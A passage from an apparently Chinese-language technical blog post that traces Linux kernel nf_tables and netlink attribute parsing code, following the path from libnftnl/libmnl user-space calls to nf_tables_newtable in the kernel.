class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nf_tables_newtable</span><span class="params">(struct net *net, struct sock *nlsk,</span></span></span><br><span class="line"><span class="params"><span class="function">      struct sk_buff *skb, <span class="keyword">const</span> struct nlmsghdr *nlh,</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="keyword">const</span> struct nlattr * <span class="keyword">const</span> nla[],</span></span></span><br><span class="line"><span class="params"><span class="function">      struct netlink_ext_ack *extack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nfgenmsg</span> *<span class="title">nfmsg</span> =</span> nlmsg_data(nlh);</span><br><span class="line">u8 genmask = nft_genmask_next(net);</span><br><span class="line"><span class="keyword">int</span> family = nfmsg-&gt;nfgen_family;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">attr</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_table</span> *<span class="title">table</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_ctx</span> <span class="title">ctx</span>;</span></span><br><span class="line">u32 flags = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">lockdep_assert_held(&amp;net-&gt;nft.commit_mutex);</span><br><span class="line">attr = nla[NFTA_TABLE_NAME];</span><br><span class="line">table = nft_table_lookup(net, attr, family, genmask);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(table)) &#123;</span><br><span class="line"><span class="keyword">if</span> (PTR_ERR(table) != -ENOENT)</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(table);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (nlh-&gt;nlmsg_flags &amp; NLM_F_EXCL) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, attr);</span><br><span class="line"><span class="keyword">return</span> -EEXIST;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (nlh-&gt;nlmsg_flags &amp; NLM_F_REPLACE)</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line"></span><br><span class="line">nft_ctx_init(&amp;ctx, net, skb, nlh, family, table, <span class="literal">NULL</span>, nla);</span><br><span class="line"><span class="keyword">return</span> nf_tables_updtable(&amp;ctx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_TABLE_FLAGS]) &#123;</span><br><span class="line">flags = ntohl(nla_get_be32(nla[NFTA_TABLE_FLAGS]));</span><br><span class="line"><span class="keyword">if</span> (flags &amp; ~NFT_TABLE_F_DORMANT)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = -ENOMEM;</span><br><span class="line">table = kzalloc(<span class="keyword">sizeof</span>(*table), GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (table == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">goto</span> err_kzalloc;</span><br><span class="line"></span><br><span class="line">table-&gt;name = nla_strdup(attr, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (table-&gt;name == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">goto</span> err_strdup;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_TABLE_USERDATA]) &#123;</span><br><span class="line">table-&gt;udata = nla_memdup(nla[NFTA_TABLE_USERDATA], GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (table-&gt;udata == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">goto</span> err_table_udata;</span><br><span class="line"></span><br><span class="line">table-&gt;udlen = nla_len(nla[NFTA_TABLE_USERDATA]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = rhltable_init(&amp;table-&gt;chains_ht, &amp;nft_chain_ht_params);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">goto</span> err_chain_ht;</span><br><span class="line"></span><br><span class="line">INIT_LIST_HEAD(&amp;table-&gt;chains);</span><br><span class="line">INIT_LIST_HEAD(&amp;table-&gt;sets);</span><br><span class="line">INIT_LIST_HEAD(&amp;table-&gt;objects);</span><br><span class="line">INIT_LIST_HEAD(&amp;table-&gt;flowtables);</span><br><span class="line">table-&gt;family = family;</span><br><span class="line">table-&gt;flags = flags;</span><br><span class="line">table-&gt;handle = ++table_handle;</span><br><span class="line"></span><br><span class="line">nft_ctx_init(&amp;ctx, net, skb, nlh, family, table, <span class="literal">NULL</span>, nla);</span><br><span class="line">err = nft_trans_table_add(&amp;ctx, NFT_MSG_NEWTABLE);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err_trans;</span><br><span class="line"></span><br><span class="line">list_add_tail_rcu(&amp;table-&gt;<span class="built_in">list</span>, &amp;net-&gt;nft.tables);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="comment">// error exit</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数首先会调用<code>nft_table_lookup</code>函数来找已存在的表，其参数分别有<code>net</code>、<code>attr</code>、<code>family</code>、<code>genmask</code>。这里的net就是<code>init_net</code>可以理解为一个全局变量。而这里的<code>attr</code>由<code>nla[NFTA_TABLE_NAME]</code>取出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  &lt;------- NLA_HDRLEN ------&gt; &lt;-- NLA_ALIGN(payload)--&gt;</span></span><br><span class="line"><span class="comment"> * +---------------------+- - -+- - - - - - - - - -+- - -+</span></span><br><span class="line"><span class="comment"> * |        Header       | Pad |     Payload       | Pad |</span></span><br><span class="line"><span class="comment"> * |   (struct nlattr)   | ing |                   | ing |</span></span><br><span class="line"><span class="comment"> * +---------------------+- - -+- - - - - - - - - -+- - -+</span></span><br><span class="line"><span class="comment"> *  &lt;-------------- nlattr-&gt;nla_len --------------&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> &#123;</span></span><br><span class="line">__u16           nla_len;</span><br><span class="line">__u16           nla_type;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>从上面的示意图可以看出的是<code>nalttr</code>由<code>header</code>、<code>payload</code>、<code>pading</code>三部分组成，这里的<code>nlaattr-&gt;nla_len</code>表示的长度为总长度，并且在结构体中是看不到有什么成员表示<code>payload</code>部分的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">err = nla_parse_deprecated(cda,</span><br><span class="line">   ss-&gt;cb[cb_id].attr_count,</span><br><span class="line">   attr, attrlen,</span><br><span class="line">   ss-&gt;cb[cb_id].policy, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>查看调用关系可以很清楚发现nla由外层函数<code>nfnetlink_rcv_batch</code>中的上述函数得来。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __nla_parse(struct nlattr **tb, <span class="keyword">int</span> maxtype,</span><br><span class="line"><span class="keyword">const</span> struct nlattr *head, <span class="keyword">int</span> len,</span><br><span class="line"><span class="keyword">const</span> struct nla_policy *policy, <span class="keyword">unsigned</span> <span class="keyword">int</span> validate,</span><br><span class="line">struct netlink_ext_ack *extack)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> __nla_validate_parse(head, len, maxtype, policy, validate,</span><br><span class="line">    extack, tb, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(__nla_parse);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">nla_parse_deprecated</span><span class="params">(struct nlattr **tb, <span class="keyword">int</span> maxtype,</span></span></span><br><span class="line"><span class="params"><span class="function">       <span class="keyword">const</span> struct nlattr *head, <span class="keyword">int</span> len,</span></span></span><br><span class="line"><span class="params"><span class="function">       <span class="keyword">const</span> struct nla_policy *policy,</span></span></span><br><span class="line"><span class="params"><span class="function">       struct netlink_ext_ack *extack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> __nla_parse(tb, maxtype, head, len, policy,</span><br><span class="line">   NL_VALIDATE_LIBERAL, extack);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __nla_validate_parse(<span class="keyword">const</span> struct nlattr *head, <span class="keyword">int</span> len, <span class="keyword">int</span> maxtype,</span><br><span class="line"><span class="keyword">const</span> struct nla_policy *policy,</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> validate,</span><br><span class="line">struct netlink_ext_ack *extack,</span><br><span class="line">struct nlattr **tb, <span class="keyword">unsigned</span> <span class="keyword">int</span> depth)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">nla</span>;</span></span><br><span class="line"><span class="keyword">int</span> rem;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (depth &gt;= MAX_POLICY_RECURSION_DEPTH) &#123;</span><br><span class="line">NL_SET_ERR_MSG(extack,</span><br><span class="line">       <span class="string">&quot;allowed policy recursion depth exceeded&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tb)</span><br><span class="line"><span class="built_in">memset</span>(tb, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct nlattr *) * (maxtype + <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">nla_for_each_attr(nla, head, len, rem) &#123;</span><br><span class="line">u16 type = nla_type(nla);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (type == <span class="number">0</span> || type &gt; maxtype) &#123;</span><br><span class="line"><span class="keyword">if</span> (validate &amp; NL_VALIDATE_MAXTYPE) &#123;</span><br><span class="line">NL_SET_ERR_MSG_ATTR(extack, nla,</span><br><span class="line">    <span class="string">&quot;Unknown attribute type&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (policy) &#123;</span><br><span class="line"><span class="keyword">int</span> err = validate_nla(nla, maxtype, policy,</span><br><span class="line">       validate, extack, depth);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tb)</span><br><span class="line">tb[type] = (struct nlattr *)nla;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(rem &gt; <span class="number">0</span>)) &#123;</span><br><span class="line">pr_warn_ratelimited(<span class="string">&quot;netlink: %d bytes leftover after parsing attributes in process `%s&#x27;.\n&quot;</span>,</span><br><span class="line">    rem, current-&gt;comm);</span><br><span class="line">NL_SET_ERR_MSG(extack, <span class="string">&quot;bytes leftover after parsing attributes&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (validate &amp; NL_VALIDATE_TRAILING)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析发现最终得到的nla也就是由<code>attr</code>经过检验了合法性之后得到的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> min_len = nlmsg_total_size(<span class="keyword">sizeof</span>(struct nfgenmsg));</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">attr</span> =</span> (<span class="keyword">void</span> *)nlh + min_len;</span><br></pre></td></tr></table></figure><p>所以最终可以得知，其实拿到的就是payload段，那么现在回到用户态来查看这究竟是怎么来的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nftnl_table_nlmsg_build_payload(nlh, table);</span><br></pre></td></tr></table></figure><p>不难看到在用户态代码中存在这样一条语句，来对nlh的payload段进行设置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">nftnl_set_nlmsg_build_payload</span><span class="params">(struct nlmsghdr *nlh, struct nftnl_set *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (s-&gt;flags &amp; (<span class="number">1</span> &lt;&lt; NFTNL_SET_TABLE))</span><br><span class="line">mnl_attr_put_strz(nlh, NFTA_SET_TABLE, s-&gt;table);</span><br><span class="line"><span class="keyword">if</span> (s-&gt;flags &amp; (<span class="number">1</span> &lt;&lt; NFTNL_SET_NAME))</span><br><span class="line">mnl_attr_put_strz(nlh, NFTA_SET_NAME, s-&gt;name);</span><br><span class="line"><span class="keyword">if</span> (s-&gt;flags &amp; (<span class="number">1</span> &lt;&lt; NFTNL_SET_FLAGS))</span><br><span class="line">mnl_attr_put_u32(nlh, NFTA_SET_FLAGS, htonl(s-&gt;set_flags));</span><br><span class="line"><span class="keyword">if</span> (s-&gt;flags &amp; (<span class="number">1</span> &lt;&lt; NFTNL_SET_KEY_TYPE))</span><br><span class="line">mnl_attr_put_u32(nlh, NFTA_SET_KEY_TYPE, htonl(s-&gt;key_type));</span><br><span class="line"><span class="keyword">if</span> (s-&gt;flags &amp; (<span class="number">1</span> &lt;&lt; NFTNL_SET_KEY_LEN))</span><br><span class="line">mnl_attr_put_u32(nlh, NFTA_SET_KEY_LEN, htonl(s-&gt;key_len));</span><br><span class="line"><span class="comment">/* These are only used to map matching -&gt; action (1:1) */</span></span><br><span class="line"><span class="keyword">if</span> (s-&gt;flags &amp; (<span class="number">1</span> &lt;&lt; NFTNL_SET_DATA_TYPE))</span><br><span class="line">mnl_attr_put_u32(nlh, NFTA_SET_DATA_TYPE, htonl(s-&gt;data_type));</span><br><span class="line"><span class="keyword">if</span> (s-&gt;flags &amp; (<span class="number">1</span> &lt;&lt; NFTNL_SET_DATA_LEN))</span><br><span class="line">mnl_attr_put_u32(nlh, NFTA_SET_DATA_LEN, htonl(s-&gt;data_len));</span><br><span class="line"><span class="keyword">if</span> (s-&gt;flags &amp; (<span class="number">1</span> &lt;&lt; NFTNL_SET_OBJ_TYPE))</span><br><span class="line">mnl_attr_put_u32(nlh, NFTA_SET_OBJ_TYPE, htonl(s-&gt;obj_type));</span><br><span class="line"><span class="keyword">if</span> (s-&gt;flags &amp; (<span class="number">1</span> &lt;&lt; NFTNL_SET_ID))</span><br><span class="line">mnl_attr_put_u32(nlh, NFTA_SET_ID, htonl(s-&gt;id));</span><br><span class="line"><span class="keyword">if</span> (s-&gt;flags &amp; (<span class="number">1</span> &lt;&lt; NFTNL_SET_POLICY))</span><br><span class="line">mnl_attr_put_u32(nlh, NFTA_SET_POLICY, htonl(s-&gt;policy));</span><br><span class="line"><span class="keyword">if</span> (s-&gt;flags &amp; (<span class="number">1</span> &lt;&lt; NFTNL_SET_DESC_SIZE))</span><br><span class="line">nftnl_set_nlmsg_build_desc_payload(nlh, s);</span><br><span class="line"><span class="keyword">if</span> (s-&gt;flags &amp; (<span class="number">1</span> &lt;&lt; NFTNL_SET_TIMEOUT))</span><br><span class="line">mnl_attr_put_u64(nlh, NFTA_SET_TIMEOUT, htobe64(s-&gt;timeout));</span><br><span class="line"><span class="keyword">if</span> (s-&gt;flags &amp; (<span class="number">1</span> &lt;&lt; NFTNL_SET_GC_INTERVAL))</span><br><span class="line">mnl_attr_put_u32(nlh, NFTA_SET_GC_INTERVAL, htonl(s-&gt;gc_interval));</span><br><span class="line"><span class="keyword">if</span> (s-&gt;flags &amp; (<span class="number">1</span> &lt;&lt; NFTNL_SET_USERDATA))</span><br><span class="line">mnl_attr_put(nlh, NFTA_SET_USERDATA, s-&gt;user.len, s-&gt;user.data);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(nftnl_set_nlmsg_build_payload);</span><br></pre></td></tr></table></figure><p>这个函数会根据不同的<code>s-&gt;flags</code>来进行不同的操作，这里先看一下这个s是怎么来的吧。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nftnl_table</span> * <span class="title">table</span> =</span> nftnl_table_alloc();</span><br><span class="line">nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);</span><br><span class="line">nftnl_table_set_u32(table, NFTNL_TABLE_FLAGS, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>这里的s就是在这里创建的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">nftnl_table_set_data</span><span class="params">(struct nftnl_table *t, <span class="keyword">uint16_t</span> attr,</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">const</span> <span class="keyword">void</span> *data, <span class="keyword">uint32_t</span> data_len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">nftnl_assert_attr_exists(attr, NFTNL_TABLE_MAX);</span><br><span class="line">nftnl_assert_validate(data, nftnl_table_validate, attr, data_len);</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (attr) &#123;</span><br><span class="line"><span class="keyword">case</span> NFTNL_TABLE_NAME:</span><br><span class="line"><span class="keyword">if</span> (t-&gt;flags &amp; (<span class="number">1</span> &lt;&lt; NFTNL_TABLE_NAME))</span><br><span class="line">xfree(t-&gt;name);</span><br><span class="line"></span><br><span class="line">t-&gt;name = strdup(data);</span><br><span class="line"><span class="keyword">if</span> (!t-&gt;name)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> NFTNL_TABLE_FLAGS:</span><br><span class="line">t-&gt;table_flags = *((<span class="keyword">uint32_t</span> *)data);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> NFTNL_TABLE_FAMILY:</span><br><span class="line">t-&gt;family = *((<span class="keyword">uint32_t</span> *)data);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> NFTNL_TABLE_USE:</span><br><span class="line">t-&gt;use = *((<span class="keyword">uint32_t</span> *)data);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">t-&gt;flags |= (<span class="number">1</span> &lt;&lt; attr);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(nftnl_table_set_data);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">nftnl_table_set_str</span><span class="params">(struct nftnl_table *t, <span class="keyword">uint16_t</span> attr, <span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> nftnl_table_set_data(t, attr, str, <span class="built_in">strlen</span>(str) + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(nftnl_table_set_str);</span><br></pre></td></tr></table></figure><p>以设置str为例（其实设置其他的也是一样的），最终会调用的<code>nftnl_table_set_data</code>函数，函数内部实现的就是根据不同的属性进行不同的操作最终给<code>struct nftnl_table</code>结构体设置上。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">nftnl_table_attr</span> &#123;</span></span><br><span class="line">NFTNL_TABLE_NAME= <span class="number">0</span>,</span><br><span class="line">NFTNL_TABLE_FAMILY,</span><br><span class="line">NFTNL_TABLE_FLAGS,</span><br><span class="line">NFTNL_TABLE_USE,</span><br><span class="line">__NFTNL_TABLE_MAX</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">nftnl_set_attr</span> &#123;</span></span><br><span class="line">NFTNL_SET_TABLE,</span><br><span class="line">NFTNL_SET_NAME,</span><br><span class="line">NFTNL_SET_FLAGS,</span><br><span class="line">NFTNL_SET_KEY_TYPE,</span><br><span class="line">NFTNL_SET_KEY_LEN,</span><br><span class="line">NFTNL_SET_DATA_TYPE,</span><br><span class="line">NFTNL_SET_DATA_LEN,</span><br><span class="line">NFTNL_SET_FAMILY,</span><br><span class="line">NFTNL_SET_ID,</span><br><span class="line">NFTNL_SET_POLICY,</span><br><span class="line">NFTNL_SET_DESC_SIZE,</span><br><span class="line">NFTNL_SET_TIMEOUT,</span><br><span class="line">NFTNL_SET_GC_INTERVAL,</span><br><span class="line">NFTNL_SET_USERDATA,</span><br><span class="line">NFTNL_SET_OBJ_TYPE,</span><br><span class="line">__NFTNL_SET_MAX</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>那么回到<code>nftnl_set_nlmsg_build_payload</code>函数中，根据这里的定义最终会调用到<code>mnl_attr_put_strz</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">EXPORT_SYMBOL <span class="keyword">void</span> <span class="title">mnl_attr_put</span><span class="params">(struct nlmsghdr *nlh, <span class="keyword">uint16_t</span> type,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">size_t</span> len, <span class="keyword">const</span> <span class="keyword">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">attr</span> =</span> mnl_nlmsg_get_payload_tail(nlh);</span><br><span class="line"><span class="keyword">uint16_t</span> payload_len = MNL_ALIGN(<span class="keyword">sizeof</span>(struct nlattr)) + len;</span><br><span class="line"><span class="keyword">int</span> pad;</span><br><span class="line"></span><br><span class="line">attr-&gt;nla_type = type;</span><br><span class="line">attr-&gt;nla_len = payload_len;</span><br><span class="line"><span class="built_in">memcpy</span>(mnl_attr_get_payload(attr), data, len);</span><br><span class="line">pad = MNL_ALIGN(len) - len;</span><br><span class="line"><span class="keyword">if</span> (pad &gt; <span class="number">0</span>)</span><br><span class="line"><span class="built_in">memset</span>(mnl_attr_get_payload(attr) + len, <span class="number">0</span>, pad);</span><br><span class="line"></span><br><span class="line">nlh-&gt;nlmsg_len += MNL_ALIGN(payload_len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">EXPORT_SYMBOL <span class="keyword">void</span> <span class="title">mnl_attr_put_strz</span><span class="params">(struct nlmsghdr *nlh, <span class="keyword">uint16_t</span> type,</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">const</span> <span class="keyword">char</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">mnl_attr_put(nlh, type, <span class="built_in">strlen</span>(data) + <span class="number">1</span>, data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里即可看到attr由<code>mnl_nlmsg_get_payload_tail</code>函数得到。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">EXPORT_SYMBOL <span class="keyword">void</span> *<span class="title">mnl_nlmsg_get_payload_tail</span><span class="params">(<span class="keyword">const</span> struct nlmsghdr *nlh)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">void</span> *)nlh + MNL_ALIGN(nlh-&gt;nlmsg_len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就是取出<code>nlh</code>头部之后的<code>payload</code>部分。</p><p>而在进行memcpy时调用的</p><figure class="highlight c"><table><tr><td 